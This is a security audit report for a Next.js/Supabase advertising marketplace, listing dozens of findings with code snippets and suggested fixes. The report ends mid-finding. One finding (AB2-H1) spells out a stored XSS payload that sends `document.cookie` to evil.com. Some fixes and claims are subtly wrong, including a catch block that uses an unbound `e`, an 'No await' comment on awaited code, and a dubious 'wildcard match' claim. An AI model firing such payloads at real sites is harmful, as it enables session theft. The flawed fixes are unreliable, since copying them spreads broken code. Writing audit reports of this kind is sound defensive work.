# AdBazaar — New Deep Audit Findings (Round 2)

**Generated:** 2026-04-17
**Scope:** `/Users/rejaulkarim/Documents/ReZ Full App/adBazaar/`
**Audit Method:** Deep source scan (all API routes, lib, types, components, middleware)
**New Issues Found:** 40 (6 CRITICAL, 10 HIGH, 19 MEDIUM, 5 LOW)
**Status:** 21 FIXED (Round 2: 10 fixed; Round 3: 11 fixed); 19 still OPEN; 0 deferred
**Note:** Supersedes and cross-references [00-INDEX.md](00-INDEX.md)

---

## CRITICAL (6)

---

### AB2-C1 — QR Scan Cooldown Bypassable via `X-Forwarded-For` Spoofing

**Status:** OPEN
**File:** `src/app/api/qr/scan/[slug]/route.ts:53-54`

**Issue:** The code takes `.at(-1)` from `X-Forwarded-For`, trusting the last IP in the chain. Any client can set this header to any IP, bypassing the 24-hour cooldown entirely.

```typescript
const forwardedFor = req.headers.get('x-forwarded-for')
const ip = (forwardedFor ? forwardedFor.split(',').at(-1)?.trim() : null) || req.headers.get('x-real-ip') || 'unknown'
```

**Fix:** Only trust `X-Real-IP` (set by reverse proxy) and validate against a `TRUSTED_PROXY_IPS` allowlist:
```typescript
const realIp = req.headers.get('x-real-ip') || 'unknown'
// Drop X-Forwarded-For entirely — it is user-controlled
```

---

### AB2-C2 — Commission Applied Twice on Quote-Based Bookings

**Status:** OPEN
**File:** `src/app/api/inquiries/[id]/accept/route.ts:49-55`

**Issue:** The `quote_amount` is a price the vendor already set, but the code adds commission on top. The buyer may expect the quote to be the final price. No flag exists to mark a quote as inclusive/exclusive of commission.

```typescript
const subtotal = Number(inquiry.quote_amount)
const commissionRate = COMMISSION_RATES[(listing?.category as string) ?? ''] ?? 15
const commissionAmount = Math.round(subtotal * commissionRate / 100)
const total = subtotal + commissionAmount  // ← buyer pays quote + commission
```

**Fix:** Add `quote_inclusive_of_commission: boolean` to inquiry, or explicitly label quote as base price vs total price in the UI.

---

### AB2-C3 — `createServerClient` Falls Back to Anon Key (RLS Disabled)

**Status:** FIXED (2026-04-17)
**File:** `src/lib/supabase.ts:4-11`

**Issue:** If `SUPABASE_SERVICE_ROLE_KEY` is missing at runtime, `createServerClient()` silently falls back to the anon key. All API routes then run with RLS enforced — reads/writes silently fail or return empty data.

```typescript
if (!key) {
 console.error('SUPABASE_SERVICE_ROLE_KEY is not set — falling back to anon key (RLS will apply)')
 return createClient(url, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ?? '')
}
```

**Fix:** Throw instead of falling back:
```typescript
if (!key) {
 throw new Error('SUPABASE_SERVICE_ROLE_KEY is not set — admin operations require service role key')
}
```

---

### AB2-C4 — Razorpay Webhook Never Verifies `payment.captured === true`

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/webhooks/razorpay/route.ts:223-228`

**Issue:** The `payment.captured` event is handled by checking if `payment` exists. The `captured` boolean is never checked. A webhook with `event: "payment.captured"` but `entity.captured: false` (possible in Razorpay's delayed-capture flow) would still mark the booking as paid.

```typescript
case 'payment.captured': {
 const payment = event.payload.payment?.entity
 if (payment) {  // ← captured never checked
 const r = await handlePaymentCaptured(supabase, payment.id, payment.order_id)
 }
```

**Fix:**
```typescript
if (payment && payment.captured === true) {
 const r = await handlePaymentCaptured(supabase, payment.id, payment.order_id)
}
```

---

### AB2-C5 — Payout Falls Back to Simulated Mode Silently in Production

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/payout/route.ts:131-141`

**Issue:** When `RAZORPAY_PAYOUT_ACCOUNT_NUMBER` is missing, payout silently switches to `simulated` mode. The booking shows as "released" in the vendor dashboard but no actual money is transferred. Only a console log is generated.

```typescript
if (process.env.RAZORPAY_PAYOUT_ACCOUNT_NUMBER) {
 return NextResponse.json({ error: 'Payout failed. Please try again.' }, { status: 502 })
}
// RAZORPAY_PAYOUT_ACCOUNT_NUMBER not configured → simulated mode
payoutMode = 'simulated'
```

**Fix:** Fail hard in production, allow simulated only in development:
```typescript
if (process.env.NODE_ENV === 'production' && !process.env.RAZORPAY_PAYOUT_ACCOUNT_NUMBER) {
 throw new Error('RAZORPAY_PAYOUT_ACCOUNT_NUMBER not configured')
}
```

---

### AB2-C6 — Marketing Broadcast Errors Silently Discarded

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/route.ts:174-194`

**Issue:** When a marketing broadcast fails (REZ API down), the error is caught, logged, and silently discarded. The `.catch(() => {})` discards even the rejection. The buyer is charged the full amount but their broadcast is never sent.

```typescript
Promise.resolve((async () => {
 try {
 const result = await triggerMarketingBroadcast({...})
 } catch (e) {
 console.error('Marketing broadcast error:', e)
 }
})()).catch(() => {})
```

**Fix:** Await the broadcast and include a `warnings` field in the response, or make it a required step that must succeed.

---

## HIGH (10)

---

### AB2-H1 — Stored XSS via Profile `name` Field

**Status:** OPEN
**File:** `src/app/api/profile/route.ts:43`

**Issue:** The PATCH handler stores raw string values without sanitization. A vendor sets their name to `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` — any admin viewing bookings/earnings tables has their session stolen.

```typescript
if (name !== undefined) update.name = String(name).trim()
// ← stored and returned as-is, rendered without escaping in dashboard tables
```

**Fix:** Sanitize all user-displayed text fields:
```typescript
import DOMPurify from 'isomorphic-dompurify'
if (name !== undefined) update.name = DOMPurify.sanitize(String(name).trim(), { ALLOWED_TAGS: [] })
```

---

### AB2-H2 — Listing View Count Has Zero Protection Against Inflation

**Status:** OPEN
**File:** `src/app/api/listings/[id]/view/route.ts`

**Issue:** No authentication, no rate limiting, no server-side tracking. Any bot or script can spam `POST /api/listings/{id}/view` to inflate counts arbitrarily. Confirms AB-C2 (rate limiting gap).

```typescript
return new NextResponse(null, { status: 204 })  // fire and forget
```

**Fix:** Add per-IP/per-session rate limiting (e.g., 1 increment per session per listing per hour) using Supabase.

---

### AB2-H3 — No Rate Limiting on Any API Endpoint

**Status:** OPEN
**File:** All API routes

**Issue:** Confirms AB-C2. Zero rate limiting exists on any endpoint. Auth endpoints, profile, bookings, listings, and payout endpoints are all vulnerable to brute-force and DoS.

**Fix:** Implement via Vercel Edge Config, Upstash Redis, or a middleware-level token bucket.

---

### AB2-H4 — Stored XSS on Profile PATCH (Redundant with AB2-H1)

**Status:** OPEN
**File:** `src/app/api/profile/route.ts`

**Issue:** Same root cause as AB2-H1 — PATCH accepts raw strings for multiple fields including `name`, `company_name`, and any other user-displayed text. No HTML sanitization anywhere.

---

### AB2-H5 — Inquiry-to-Booking Bypasses Listing Status Check

**Status:** OPEN
**File:** `src/app/api/inquiries/[id]/accept/route.ts:34-39, 57-82`

**Issue:** `POST /api/inquiries/[id]/accept` creates a booking without checking if the listing is still `active`. The direct booking path (`POST /api/bookings`) has this guard, but the inquiry flow does not.

```typescript
// POST /api/bookings has this:
if ((listing as Record<string, unknown>).status !== 'active') {
 return NextResponse.json({ error: 'This listing is not currently available' }, { status: 400 })
}
// POST /api/inquiries/[id]/accept — no such check
```

**Fix:** Add listing status check before creating booking:
```typescript
const listing = inquiry.listings as Record<string, unknown>
if ((listing?.status as string) !== 'active') {
 return NextResponse.json({ error: 'This listing is no longer available' }, { status: 400 })
}
```

---

### AB2-H6 — Double Payout Race Condition in Razorpay Payout

**Status:** OPEN
**File:** `src/app/api/vendor/payout/route.ts:144-160`

**Issue:** The idempotency guard (`.is('payout_id', null)`) is checked AFTER the Razorpay payout is created. Two concurrent requests both trigger `rz.payouts.create()` before either writes `payout_id`. Two separate payouts are created; only one is recorded on the booking. **Double payout.**

```
Request A: create payout "payout_abc"  → SUCCESS
Request B: create payout "payout_def"  → SUCCESS
Request A: update booking set payout_id = "payout_abc" → SUCCESS
Request B: update booking set payout_id = "payout_def" → FAIL (already set)
→ Two payouts created, only one recorded.
```

**Fix:** Move the Razorpay payout creation inside the idempotent DB transaction, or use a Supabase RPC that handles payout creation and booking update atomically.

---

### AB2-H7 — Razorpay Order Creation Has No Idempotency Key

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/route.ts:196-225`

**Issue:** `rz.orders.create()` is called without `idempotency_key`. If the client request times out but the order succeeds on Razorpay's side, a retry creates a duplicate Razorpay order.

```typescript
const order = await rz.orders.create({
 amount: total * 100,
 currency: 'INR',
 receipt: booking.id,  // receipt is for reference, not idempotency
 notes: { bookingId: booking.id, listingId, buyerId },
})
```

**Fix:**
```typescript
const order = await rz.orders.create({
 amount: total * 100,
 currency: 'INR',
 receipt: booking.id,
 idempotency_key: booking.id,  // ← add this
 notes: { bookingId: booking.id, listingId, buyerId },
})
```

---

### AB2-H8 — Quote Expiry Not Enforced at Booking Creation

**Status:** OPEN
**File:** `src/app/api/inquiries/[id]/accept/route.ts:44-47`

**Issue:** `quote_valid_until` is checked, but if it expires between the buyer's page load and their click, the flow fails with a generic error. The buyer sees no clear indication that the quote expired mid-session.

```typescript
if (inquiry.quote_valid_until && new Date(inquiry.quote_valid_until) < new Date()) {
 return NextResponse.json({ error: 'Quote has expired' }, { status: 400 })
}
```

**Fix:** Re-fetch quote validity inside the transaction and suggest requesting a new quote with a specific error message.

---

### AB2-H9 — Duplicate Inquiry Check Has Race Condition

**Status:** OPEN
**File:** `src/app/api/inquiries/route.ts:50-60`

**Issue:** Two concurrent POST requests from the same buyer for the same listing both pass the duplicate check before either inserts. Two inquiries are created.

```typescript
const { data: existing } = await supabase.from('inquiries').select('id')
 .eq('listing_id', listingId).eq('buyer_id', user.id)
 .in('status', ['pending', 'quoted']).maybeSingle()
if (existing) { return NextResponse.json({ error: 'Already open' }, { status: 409 }) }
// ← Race window: another request passes the check before this insert
```

**Fix:** Add a partial unique index on `(listing_id, buyer_id)` where `status IN ('pending', 'quoted')` at the DB level, making duplicate prevention atomic.

---

### AB2-H10 — Proof Upload Allows Status Regression (Potential)

**Status:** OPEN
**File:** `src/app/api/bookings/[id]/proof/route.ts:51-53`

**Issue:** The proof upload endpoint allows status `confirmed`, `paid`, or `executing` to remain `executing`. However, the PATCH `vendor_proof_uploaded` action unconditionally sets status to `Executing` without checking the current status. A race condition could theoretically regress a booking from `Completed` to `Executing`.

**Fix:** Add a status guard in the PATCH handler to only allow advancing from `confirmed`/`paid` to `executing`, not from any status.

---

## MEDIUM (19)

---

### AB2-M1 — `qr_enabled` Flag Not Respected in Booking Creation

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/route.ts:128-148`

**Issue:** QR code is always created for every booking, regardless of `listing.qr_enabled`. A buyer browsing non-QR listings still generates QR codes.

**Fix:** Check `if (listing.qr_enabled)` before inserting the QR code record.

---

### AB2-M2 — `handlePaymentFailed` Notifies Vendor, Not Buyer

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/webhooks/razorpay/route.ts:114-130`

**Issue:** Payment failure notification is sent to `booking.vendor_id`, but the buyer is the one whose payment failed. The vendor gets a confusing notification about "booking payment failed" when they didn't initiate the payment.

```typescript
body: `Booking payment for "${title ?? 'your listing'}" failed: ...`,
link: '/vendor/bookings',  // ← goes to vendor
// Buyer (who actually failed payment) receives nothing
```

**Fix:** Send the failure notification to `booking.buyer_id`, not `booking.vendor_id`.

---

### AB2-M3 — `handlePaymentFailed` Silently Discards Unmatched Orders

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/webhooks/razorpay/route.ts:97-99`

**Issue:** If the booking is not found for a `payment.failed` event, the function returns `{ updated: 0 }` with no logging. Silent discard hides potential webhook attack attempts or data inconsistency.

```typescript
if (!booking) {
 return { updated: 0 }  // ← no log, no trace
}
```

**Fix:**
```typescript
if (!booking) {
 console.warn(`[razorpay webhook] payment.failed: booking not found for order ${orderId}`)
 return { updated: 0 }
}
```

---

### AB2-M4 — `increment_qr_scan_counts` RPC Has No Error Handling

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/qr/scan/[slug]/route.ts:133-137`

**Issue:** The RPC call has no error handling. If the function doesn't exist in the database, scan counts silently fail to update.

```typescript
await supabase.rpc('increment_qr_scan_counts', {
 qr_id: qr.id,
 inc_unique: isNewScanner,
})
// ← No error handling. Silent failure if RPC doesn't exist.
```

**Fix:**
```typescript
const { error: rpcError } = await supabase.rpc('increment_qr_scan_counts', {...})
if (rpcError) {
 console.error('[qr/scan] RPC increment failed:', rpcError)
}
```

---

### AB2-M5 — REZ Visit Webhook Silently Ignores Missing Scan Event

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/webhooks/rez-visit/route.ts:38-51`

**Issue:** If `scanEvent` is null (scanEventId not found), the function returns `{ success: true }` without any log or anomaly flag. A REZ server sending a visit webhook for a non-existent scan event gets a success response.

```typescript
const { data: scanEvent } = await supabase.from('scan_events').select('*').eq('id', scanEventId).single()
if (scanEvent) { /* ... */ }
// ← No else branch. Returns success even if scanEvent was not found.
```

**Fix:**
```typescript
if (!scanEvent) {
 console.warn(`[rez-visit] scan event not found: ${scanEventId}`)
 return NextResponse.json({ success: true, skipped: true })
}
```

---

### AB2-M6 — `emailProofApproved` Has No CTA Links

**Status:** OPEN
**File:** `src/lib/email.ts:123`

**Issue:** The proof approval email has no links. Compare with `emailQuoteReceived` which correctly links to the inquiries page. A vendor who gets paid out has no way to navigate to their earnings from the email.

**Fix:** Add `const appUrl = process.env.NEXT_PUBLIC_APP_URL ?? ''` and include a link to `/vendor/earnings`.

---

### AB2-M7 — Inconsistent Auth Patterns Across API Routes

**Status:** OPEN
**File:** Multiple API routes

**Issue:** Different routes use different auth patterns: some use `createClient` with `global: { headers: { Authorization: Bearer ... } }`, others use `supabase.auth.getUser(token)`, and `adminAuth.ts` manually parses cookies. This inconsistency creates bugs.

**Fix:** Centralize all auth into a single `authenticateApiRequest(req)` helper.

---

### AB2-M8 — `adminAuth.ts` Fragile Cookie Parsing

**Status:** OPEN
**File:** `src/lib/adminAuth.ts:14-24`

**Issue:** The cookie parser manually searches for cookies containing `auth-token`, parses JSON, and accesses nested `access_token`. This breaks if Supabase changes their cookie format. Already flagged as AB-H2.

**Fix:** Use `supabase.auth.getUser()` with a properly configured server client instead of manual cookie parsing.

---

### AB2-M9 — `ListingStatus` Type Missing `'archived'`

**Status:** FIXED (2026-04-17)
**File:** `src/types/index.ts:128`

**Issue:** `Listing` interface defines `status` as `'draft' | 'active' | 'paused' | 'rejected'`. The DELETE handler sets `status: 'archived'`, which is not in the type. TypeScript won't catch this, and Supabase silently accepts the invalid enum value.

```typescript
// types: status: 'draft' | 'active' | 'paused' | 'rejected'
// route: .update({ status: 'archived', ... })  ← type-safe failure
```

**Fix:** Add `'archived'` to the `status` union in the `Listing` interface.

---

### AB2-M10 — `device_type` and `city_derived` in DB But Not in TypeScript

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/qr/scan/[slug]/route.ts:80-91` + `src/types/index.ts:197-210`

**Issue:** The `scan_events` insert uses `device_type`, `city_derived`, and `country_derived` fields, but the `ScanEvent` TypeScript interface doesn't define them. This creates schema-to-type drift.

**Fix:** Add to `ScanEvent` interface:
```typescript
device_type?: string | null
city_derived?: string | null
country_derived?: string | null
```

---

### AB2-M11 — IP Geolocation Uses HTTP (Not HTTPS)

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/qr/scan/[slug]/route.ts:20-21`

**Issue:** `http://ip-api.com/json/` is called over HTTP. Many cloud production environments block outbound HTTP, or the service may redirect to HTTPS-only.

```typescript
const res = await fetch(
 `http://ip-api.com/json/${ip}?fields=city,country`,  // ← HTTP
```

**Fix:** Change to `https://ip-api.com/json/`.

---

### AB2-M12 — Cart Page Redirects on Payment Cancel Without Booking State

**Status:** OPEN
**File:** `src/app/(buyer)/buyer/cart/page.tsx:221-231`

**Issue:** When Razorpay is dismissed, the booking already exists in `inquiry` status. The buyer sees no indication that their booking is saved. They might try to book again, creating duplicate bookings.

```typescript
} catch (e: unknown) {
 const msg = e instanceof Error ? e.message : 'Failed'
 if (msg !== 'Payment cancelled') { setError(msg) }
}
// ← Buyer sees nothing. Booking is in inquiry status with no payment.
```

**Fix:** After dismiss, show "Your booking is saved in inquiry status" with a link to `/buyer/bookings`.

---

### AB2-M13 — Browse Page Missing `fetchListings` in Effect Dependencies

**Status:** OPEN
**File:** `src/app/(marketplace)/browse/page.tsx:105-109`

**Issue:** The `useEffect` suppresses the exhaustive-deps lint warning. If `fetchListings` is recreated, the effect continues using the stale closure.

```typescript
useEffect(() => {
 fetchListings(1, false)
 // eslint-disable-next-line react-hooks/exhaustive-deps
}, [city, category, minPrice, maxPrice, availabilityModel, qrEnabled, searchQ])
```

**Fix:** Use `useCallback` with proper memoization for `fetchListings`.

---

### AB2-M14 — Vendor Dashboard Counts `paid`+`executing` as "Earnings"

**Status:** OPEN
**File:** `src/app/(vendor)/vendor/dashboard/page.tsx:99`

**Issue:** `totalEarnings` sums `vendor_payout` for bookings with status `paid`, `executing`, or `completed`. But `paid` means the booking is confirmed but not yet executed — payout is not yet released. Vendors see inflated earnings that include unpaid bookings.

```typescript
totalEarnings: bookings
 .filter((b: { status: string }) => ['paid', 'executing', 'completed'].includes(b.status))
 .reduce((sum: number, b: { vendor_payout: number }) => sum + (b.vendor_payout ?? 0), 0),
```

**Fix:** Only include `completed` in `totalEarnings`, or create separate "earned" vs "pending" buckets.

---

### AB2-M15 — `total_spent` Not Updated When Bookings Removed from Campaign

**Status:** OPEN
**File:** `src/app/api/campaigns/[id]/route.ts:59-63`

**Issue:** When bookings are removed from a campaign via `removeBookingIds`, the `total_spent` field is never recalculated. The column becomes stale.

```typescript
const update: Record<string, unknown> = {
 booking_ids: bookingIds,
 // total_spent not recalculated
}
```

**Fix:** Recalculate `total_spent` as the sum of all remaining booking amounts whenever `booking_ids` changes.

---

### AB2-M16 — Marketing Service URL Uses HTTP Not HTTPS

**Status:** FIXED (2026-04-17)
**File:** `src/lib/marketing.ts:1,24`

**Issue:** `MARKETING_SERVICE_URL` could be `http://`. Internal service-to-service calls should enforce HTTPS.

**Fix:** Validate or enforce HTTPS in the fetch call:
```typescript
const url = MARKETING_SERVICE_URL?.replace(/^http:/, 'https:')
const res = await fetch(`${url}/adbazaar/broadcast`, {...})
```

---

### AB2-M17 — Notification `body` Field Not in TypeScript Types

**Status:** FIXED (2026-04-17)
**File:** `src/types/index.ts`

**Issue:** Notifications are inserted with a `body` field throughout the codebase, but no `Notification` interface exists in `types/index.ts`. If the `notifications` table uses a different column name, all notification inserts silently fail.

**Fix:** Create a `Notification` interface matching the actual `notifications` table schema.

---

### AB2-M18 — Auth Token Replace Pattern Fragile on Malformed Headers

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/listings/[id]/route.ts:87` + `src/app/api/admin/disputes/resolve/route.ts`

**Issue:** `"Bearer ".replace('Bearer ', '')` returns `"Bearer"` if the header is `"Bearer"` (no space), not `"Bearer token"`. This would call `getUser("Bearer")` with unexpected behavior.

```typescript
const token = authHeader.replace('Bearer ', '').trim()
// If authHeader = "Bearer" → token = "Bearer"
```

**Fix:** Use a safe extraction:
```typescript
const accessToken = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null
if (!accessToken) { return NextResponse.json({ error: 'Forbidden' }, { status: 403 }) }
```

---

### AB2-M19 — `forgot-password` and `reset-password` Missing from Public Route List

**Status:** FIXED (2026-04-17)
**File:** `src/middleware.ts`

**Issue:** These routes are in the `matcher` but not in the public route short-circuit list. Unauthenticated users hitting `/forgot-password` redirect to login instead of seeing the page.

**Fix:** Add `forgot-password` and `reset-password` to the public routes array in the middleware.

---

## LOW (5)

---

### AB2-L1 — `<img>` Tags Instead of Next.js `<Image>` Throughout UI

**Status:** OPEN
**Files:** `src/app/(marketplace)/listing/[id]/ListingDetailClient.tsx`, `src/components/listing/ListingCard.tsx`, `src/app/(vendor)/vendor/listings/new/StepMedia.tsx`, `src/app/(buyer)/buyer/bookings/page.tsx`

**Issue:** Multiple pages use bare `<img>` tags instead of Next.js `<Image>`, bypassing optimization and causing CLS.

**Fix:** Replace with `<Image>` with proper `width`, `height`, and `priority` props.

---

### AB2-L2 — `ListingCard` Enum Fallback Hides Invalid Categories

**Status:** OPEN
**File:** `src/components/listing/ListingCard.tsx:4-24`

**Issue:** `CATEGORY_BADGE_COLORS[listing.category] ?? { bg: '#1a1a1a', text: '#a3a3a3' }` silently falls back for invalid categories. Invalid categories are invisible to admins.

**Fix:** Add a console.warn for invalid categories to make them discoverable:
```typescript
if (!CATEGORY_BADGE_COLORS[listing.category]) {
 console.warn(`Unknown category: ${listing.category}`)
}
```

---

### AB2-L3 — Middleware Matcher Includes Redundant Routes

**Status:** OPEN
**File:** `src/middleware.ts:102-113`

**Issue:** `/browse/:path*` is in the matcher but `/browse` is already in the public route short-circuit. The `scan/:path*` matcher is correct for public QR scans.

**Fix:** Remove redundant `/browse/:path*` from the matcher, or consolidate the public route logic.

---

### AB2-L4 — BookingStatus Enum vs String Literal Inconsistency

**Status:** OPEN
**File:** `src/app/api/bookings/route.ts:286-290` + `src/app/(buyer)/buyer/bookings/page.tsx:241-243`

**Issue:** The API returns status as a string (e.g., `"confirmed"`). The frontend uses `BookingStatus.Inquiry` (an enum value). If the API returns a different casing, the status filter breaks silently.

**Fix:** Normalize status to lowercase in the API response, or validate that status values match the enum at runtime.

---

### AB2-L5 — `Promise.resolve` Fire-and-Forget in Serverless Edge Cases

**Status:** OPEN
**File:** All API routes with notification/email delivery

**Issue:** `Promise.resolve().then().catch()` patterns are used extensively. In serverless cold starts, Node.js could terminate before the promise settles.

**Fix:** Await non-critical async operations within a bounded timeout, or use a queue (BullMQ/SQS) for email/notification delivery.

---

## Round 3 — Additional Findings (2026-04-17)

### AB3-C1 — Campaign IDOR: Buyer Can Remove Other Buyers' Bookings

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/campaigns/[id]/route.ts:60-63`

**Issue:** `removeBookingIds` are removed from a campaign and their `campaign_id` is set to `null` without verifying those bookings belong to the authenticated buyer or to this campaign. A buyer can unlink any booking's campaign association if they know the booking ID.

```typescript
if (Array.isArray(removeBookingIds) && removeBookingIds.length > 0) {
 bookingIds = bookingIds.filter((id) => !removeBookingIds.includes(id))
 await supabase.from('bookings').update({ campaign_id: null }).in('id', removeBookingIds)
 // ← No .eq('buyer_id', user.id) — can remove ANY booking
}
```

**Fix:** Add ownership filter:
```typescript
await supabase.from('bookings')
 .update({ campaign_id: null })
 .eq('buyer_id', user.id)
 .in('id', removeBookingIds)
```

---

### AB3-C2 — Vendor Listing POST Has No Role Verification

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/listings/route.ts:60-66`

**Issue:** Any authenticated user — buyer, admin, or anyone with a valid token — can create a listing. The code checks `user?.id` exists but never queries the `users` table to verify `role === 'vendor'`.

```typescript
if (authHeader?.startsWith('Bearer ')) {
 const { data: { user } } = await supabase.auth.getUser(token)
 vendorId = user?.id ?? null
}
if (!vendorId) { return 401 }
// ← No check: role must be 'vendor'
await supabase.from('listings').insert({ vendor_id: vendorId, ... })
```

**Fix:** Query users table to verify vendor role:
```typescript
const { data: userRow } = await supabase
 .from('users').select('role').eq('id', user.id).single()
if (userRow?.role !== 'vendor') {
 return NextResponse.json({ error: 'Only vendors can create listings' }, { status: 403 })
}
```

---

### AB3-C3 — Campaign Booking Updates Not Awaited — Creates Orphan State

**Status:** FIXED (2026-04-17)
**Files:** `src/app/api/campaigns/route.ts:108`, `src/app/api/campaigns/[id]/route.ts:55,62`

**Issue:** `supabase.from('bookings').update(...).in('id', ...)` is called without `await` and errors are not checked. The campaign is created/updated but the booking links may never be updated. The client receives a success response for an inconsistent state.

```typescript
// campaigns/route.ts:108
await supabase.from('bookings').update({ campaign_id: campaign.id }).in('id', validatedIds)
// ← No error check. No await.

// campaigns/[id]/route.ts:55
await supabase.from('bookings').update({ campaign_id: campaignId }).in('id', addIds)
// ← Awaited but no error check
```

**Fix:** Await and check errors:
```typescript
const { error: updateError } = await supabase
 .from('bookings').update({ campaign_id: campaign.id }).in('id', validatedIds)
if (updateError) {
 await supabase.from('campaigns').delete().eq('id', campaign.id)
 return NextResponse.json({ error: 'Failed to link bookings' }, { status: 500 })
}
```

---

### AB3-C4 — `verifyPaymentSignature` Throws on Length Mismatch — Silent False

**Status:** FIXED (2026-04-17)
**File:** `src/lib/razorpay.ts:34`

**Issue:** `crypto.timingSafeEqual` throws `ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH_MISMATCH` if the two buffers have different byte lengths. The catch block returns `false` silently without logging — a signature with the wrong byte length is treated as a verification failure with no indication of the cause.

```typescript
try {
 return crypto.timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expected, 'hex'))
} catch {
 return false  // ← silently swallows timing mismatch
}
```

**Fix:** Explicit length check with logging:
```typescript
if (signature.length !== expected.length) {
 console.warn('[razorpay] signature length mismatch — possible tampering')
 return false
}
try {
 return crypto.timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expected, 'hex'))
} catch {
 console.error('[razorpay] timingSafeEqual error:', e)
 return false
}
```

---

### AB3-H1 — Analytics Uses Wrong Supabase Syntax for Array Filter

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/vendor/analytics/route.ts:33`

**Issue:** The Supabase JS client expects an array for the `in` operator, but a string literal is passed. This produces incorrect SQL and silently returns wrong results (bookings with `cancelled` or `inquiry` status are included when they should be excluded).

```typescript
.not('status', 'in', '(cancelled,inquiry)')  // ← String, not array
// Generates: WHERE status NOT IN ('(cancelled,inquiry)') — single string value
```

**Fix:**
```typescript
.not('status', 'in', ['cancelled', 'inquiry'])  // ← Array
```

---

### AB3-H2 — QR Scan `isNewScanner` Race Condition

**Status:** OPEN
**File:** `src/app/api/qr/scan/[slug]/route.ts:94-101`

**Issue:** Two concurrent scan requests from the same IP both read `priorScans === 0` before either inserts, causing both to receive `isNewScanner = true` and both increments to fire.

```typescript
const isNewScanner = (priorScans ?? 0) === 0
// ← Check and insert are not atomic
await supabase.from('scan_events').insert(...)
```

**Fix:** Use Supabase RPC with atomic upsert, or add a unique constraint on `(qr_id, user_id, ip_address)` and handle the conflict:
```typescript
// In the RPC increment_qr_scan_counts, handle unique violations atomically
```

---

### AB3-H3 — Campaign PATCH Has No Status Validation

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/campaigns/[id]/route.ts:71`

**Issue:** Any arbitrary string can be written as campaign status. A buyer could set `status: 'deleted'` or `status: 'DONE'` bypassing the allowed state machine.

```typescript
if (status) update.status = status
// ← status is any string, no enum check
```

**Fix:** Validate against allowed values:
```typescript
if (status && !['active', 'paused', 'completed'].includes(status)) {
 return NextResponse.json({ error: 'Invalid status' }, { status: 422 })
}
update.status = status
```

---

### AB3-H4 — Inquiry Vendor ID Null Causes SQL Wildcard Match

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/inquiries/[id]/accept/route.ts:151-163`

**Issue:** `inquiry.vendor_id` can be null. The user lookup uses `.in('id', [user.id, inquiry.vendor_id])` — when `vendor_id` is null, this could match unintended rows in some database configurations.

```typescript
.in('id', [user.id, inquiry.vendor_id])
// inquiry.vendor_id is null → query includes null in the IN clause
```

**Fix:** Guard against null:
```typescript
const vendorId = inquiry.vendor_id
if (!vendorId) {
 return NextResponse.json({ error: 'Inquiry has no vendor' }, { status: 400 })
}
.in('id', [user.id, vendorId])
```

---

### AB3-H5 — Profile PATCH Missing `await req.json()` — Body Undefined

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/profile/route.ts:39-53`

**Issue:** The PATCH handler destructures `body` but `body` is never assigned. `await req.json()` is missing. Every field access `body.name`, `body.phone` etc. will throw `TypeError: Cannot read properties of undefined`.

```typescript
export async function PATCH(req: NextRequest) {
 const user = await authenticate(req)
 if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
 const supabase = createServerClient()
 // ← Missing: const body = await req.json()
 const { name, phone, ... } = body  // body is undefined!
```

**Fix:** Add the missing line:
```typescript
const body = await req.json()
const { name, phone, company_name, bio, website, city, gst_number, pan_number, bank_account_name, bank_account_number, bank_ifsc, upi_id } = body
```

---

### AB3-H6 — Booking Dates: Invalid Strings Produce NaN, Bypass Duration Check

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/route.ts:75-90`

**Issue:** `new Date('not-a-date')` produces `Invalid Date` with `getTime() === NaN`. `NaN - NaN = NaN`, so `durationDays < 1` is `false` and the check passes. A booking with invalid dates is created with `durationDays = NaN`.

```typescript
const start = new Date(startDate)
const end = new Date(endDate)
durationDays = Math.ceil((end.getTime() - start.getTime()) / (1000 * 60 * 60 * 24))
if (durationDays < 1) { ... }  // ← NaN < 1 is false — check passes
```

**Fix:**
```typescript
const start = new Date(startDate)
const end = new Date(endDate)
if (isNaN(start.getTime()) || isNaN(end.getTime())) {
 return NextResponse.json({ error: 'Invalid date format' }, { status: 400 })
}
```

---

### AB3-H7 — Booking `slots` Type Not Validated — Silent Price Override

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/bookings/route.ts:87-88`

**Issue:** If `slots` is present but not an array, `Array.isArray(slots)` returns `false` and execution falls through to `subtotal = pricePerUnit`. The caller intended slot-based pricing but gets per-unit pricing silently.

```typescript
} else if (Array.isArray(slots) && slots.length > 0) {
 subtotal = slots.length * pricePerUnit
} else {
 subtotal = pricePerUnit  // ← slots present but wrong type → silent fallback
}
```

**Fix:** Return 400 if slots is provided but not an array:
```typescript
if (slots !== undefined && !Array.isArray(slots)) {
 return NextResponse.json({ error: 'slots must be an array' }, { status: 400 })
}
```

---

### AB3-H8 — Inquiry `role` Query Param Not Validated

**Status:** FIXED (2026-04-17)
**File:** `src/app/api/inquiries/route.ts:113`

**Issue:** The `role` query parameter is accepted as-is. Any value other than `'vendor'` falls through to the buyer query, potentially surprising callers who expect role-based filtering.

```typescript
const role = new URL(req.url).searchParams.get('role') ?? 'buyer'
// ← 'admin', 'superuser', '', etc. all fall through to buyer query
```

**Fix:** Validate role parameter:
```typescript
